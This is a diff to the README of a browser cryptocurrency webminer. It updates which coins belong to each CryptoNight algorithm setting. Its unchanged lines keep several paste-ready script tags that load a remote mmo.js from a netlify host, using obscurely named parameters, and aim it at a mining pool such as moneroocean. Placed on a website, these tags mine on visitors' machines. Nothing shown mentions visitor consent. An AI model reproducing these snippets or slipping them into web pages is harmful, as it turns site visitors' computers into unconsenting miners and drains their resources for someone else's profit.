@@ -16,7 +16,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | INTUcoin | Lethean (IntenseC
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008" > </script>
 ```
-#### Examples: CN R Coins (Monero, Lethean) need ?algo=cn/r<br> 
+#### Examples: CN R Coins (Monero, Lethean, Sumokoin) need ?algo=cn/r<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
@@ -28,7 +28,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | INTUcoin | Lethean (IntenseC
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN ASIC Coins (Electroneum, Bytecoin, Sumokoin, Dero, Xeonbit, Pennykoin, Beldex, Newton, Karbo, X12 Coin, B2Bcoin) need ?algo=cn/0<br> 
+#### Examples: CN ASIC Coins (Bytecoin, Dero, Xeonbit, Pennykoin, Beldex, Newton, Karbo, X12 Coin, B2Bcoin) need ?algo=cn/0<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/0?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
@@ -36,15 +36,15 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | INTUcoin | Lethean (IntenseC
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/xtl?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Lite V7 Coins (Aeon, BitcoiNote, BBSCoin, Triton) need ?algo=cn-lite/1
+#### Examples: CN Lite V7 Coins (Aeon, BitcoiNote, Triton) need ?algo=cn-lite/1
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-lite/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Pico Coins (Turtlecoin, NXstream, ArQma) need ?algo=cn-pico/trtl
+#### Examples: CN Pico Coins (Turtlecoin, NXstream, ArQma, Iridium, Loki) need ?algo=cn-pico/trtl
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-pico/trtl?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Fast V2 | CN Half Coins (Masari) need ?algo=cn/half<br> 
+#### Examples: CN Fast V2 | CN Half Coins (Masari, Torque) need ?algo=cn/half<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/half?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
